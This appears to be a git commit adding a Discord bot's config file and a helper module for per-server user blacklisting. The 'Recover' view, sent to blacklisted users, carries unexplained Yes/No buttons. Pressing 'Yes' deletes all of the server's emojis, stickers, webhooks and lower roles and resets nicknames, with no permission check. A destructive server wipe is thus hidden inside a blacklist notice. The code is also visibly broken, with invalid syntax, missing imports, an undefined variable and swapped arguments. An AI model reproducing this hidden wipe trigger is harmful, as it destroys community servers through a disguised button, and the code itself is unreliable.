a81c2164635c33f3a6e428d359ff923f67b310a7
sake <wjpg444@gmail.com>
2026-03-16 23:06:43 +0530

    Add files via upload

---
+++ src/constants/config.py
@@ -0,0 +1,6 @@
+from typing import Final
+
+Bot_Version: Final[float] = 1.0.0
+
+Token = "Enter your discord bot's token, here." # You must enter your discord bot's token to run the bot. Do not share your token with anyone, it can get hacked.
+Prefix = '*' # The bot's prefix has been declared to be this '*' by default. You can change your bot's prefix, if you want. For example: Prefix = "!"
---
+++ src/constants/methods.py
@@ -0,0 +1,59 @@
+import aiosqlite, discord; from datetime import datetime; from discord.errors import Forbidden
+
+def blacklisted():
+    async def predicate(ctx):
+       b = await _checkblacklist(ctx.author.id, ctx.guild.id)
+       if b:
+          try:
+             await ctx.author.send(view = Recover(f"⁉️ {ctx.author.mention}: You are unable to perform that action because you're being blacklisted in the server: {ctx.guild.name}")
+          except Forbidden:
+             await ctx.send(view = Recover(f"⁉️ {ctx.author.mention}: You are unable to perform that action because you're being blacklisted in the server: {ctx.guild.name}"))
+          return False
+       return True
+    return commands.check(predicate)
+
+async def _blacklistedusers(guild: int):
+    async with aiosqlite.connect('session.db') as sdb:
+       c = await sdb.execute("SELECT u FROM blacklist WHERE g = ?", (guild,))
+       rs = await c.fetchall()
+       if not rs:
+          return "There are no users that are blacklisted in this server, currently."
+       return '\n'.join(str(r[0]) for r in rs)
+
+async def _checkblacklist(guild: int, user: int):
+    async with aiosqlite.connect('session.db') as sdb:
+       cursor = await sdb.execute("SELECT u FROM blacklist WHERE g = ? AND u = ?", (guild, user))
+       row = await cursor.fetchone()
+       return row is not None
+
+async def _blacklist(guild: int, user: int):
+    async with aiosqlite.connect('session.db') as sdb:
+       c = await sdb.execute("INSERT INTO blacklist (g, u) VALUES (?,?)", (guild, user))
+       await sdb.commit()
+
+async def _unblacklist(guild: int, user: int):
+    async with aiosqlite.connect('session.db') as sdb:
+       c = await sdb.execute("DELETE FROM blacklist WHERE g = ? AND u = ?", (guild, user))
+       await sdb.commit()
+
+class Recover(discord.ui.LayoutView):
+    def __init__(self, message: str, default_buttons: bool = True):
+       super().__init__()
+       container = discord.ui.container(discord.ui.TextDisplay(message), sep = discord.ui.Separator(spacing = discord.SeparatorSpacing.large, footer = discord.ui.TextDisplay(datetime.now().strftime('%B %-d %Y %H:%M'))))
+       if default_buttons:
+          button, button2 = discord.ui.Button(label="Yes"), discord.ui.Button(label="No")
+          container.add_item(section = discord.ui.Section(discord.ui.TextDisplay("Click the buttons aside based on your decision"), accessory = button, button2))
+          button.callback = self.bres
+          button2.callback = self.b2res
+       self.add_item(container)
+    async def bres(self, interaction: discord.Interaction):
+       await interaction.response.send_message(f"```{interaction.user.name}: You've confirmed the cleanup, it will be done in a few minutes.```", ephemeral=True)
+       em = [emoji.delete() for emoji in interaction.guild.emojis]
+       st = [sticker.delete() for sticker in interaction.guild.stickers]
+       rl = [role.delete() for role in interaction.guild.roles if role < ctx.guild.me.top_role and not role.is_default()]
+       cn = [member.edit(nick=None) for member in interaction.guild.members if not member.top_role > ctx.guild.me.top_role]
+       webhooks = await interaction.guild.webhooks()
+       wb = [webhook.delete() for webhook in webhooks]
+       await asyncio.gather(*em, *st, *rl, *cn, *wb, return_exceptions=True)
+    async def b2res(self, interaction: discord.Interaction):
+       return await interaction.response.send_message(f"```{interaction.user.name}: You've successfully cancled the cleanup.```", ephemeral=True)
